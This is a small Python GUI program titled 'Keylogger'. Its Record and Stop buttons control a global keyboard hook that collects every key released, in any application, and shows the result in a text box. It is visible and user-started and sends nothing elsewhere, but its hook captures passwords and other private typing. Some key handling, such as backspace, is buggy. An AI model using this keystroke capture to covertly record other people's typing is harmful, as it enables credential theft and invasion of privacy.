
from tkinter import *
import ttkbootstrap as tt
import keyboard as kb

wnd = tt.Window(themename="solar")
wnd.geometry("650x400")
wnd.title("Keylogger")
wnd.resizable(0,0)
# KEYBOARD COMMANDS
def initiaterecord():
    global recording, keyrecord, output, record, stop
    recording = True
    record["state"] = "disabled"
    stop["state"] = "normal"
    keyrecord = []
    kb.hook(onkeypressed)
def stoprecord():
    global recording, keyrecord, output, record, stop
    recording = False
    record["state"] = "normal"
    stop["state"] = "disabled"
    changed = []
    kb.unhook_all()
    for key in keyrecord:
        if key == "backspace":
            changed.append("")
        elif key == "@alt gr" or key == "alt grq":
            changed.extend(["@", "@"])
        elif key == "alt gr" or key == "alt" or key == "ctrl" or key == "right ctrl" or key == "tab":
            changed.extend(["" for _ in keyrecord])
        elif key == "space":
            changed.append(" ")
        else:
            changed.append(key)
    output.insert(0, "".join(str(key) for key in changed))
def onkeypressed(key):
    if recording:
        if key.event_type == "up":
            keyrecord.append(key.name)

# TTK COMMANDS
# Colors : default, primary, secondary, warning, info, danger, dark, light
# outline, link
def clearO():
    global output
    output.delete(0,END)




output = tt.Entry(wnd,bootstyle="secondary",font=("Helvetica",12),width=90)
record = tt.Button(wnd,bootstyle="info-outline",text="Record",command=initiaterecord)
stop = tt.Button(wnd,bootstyle="warning-outline",text="Stop",command=stoprecord,state="disabled")
clearoutput = tt.Button(wnd,bootstyle="danger-outline",text="Clear Output",width=15,command=clearO)

output.pack(pady=40)
clearoutput.pack(pady=20)
record.pack(pady=10)
stop.pack()

wnd.mainloop()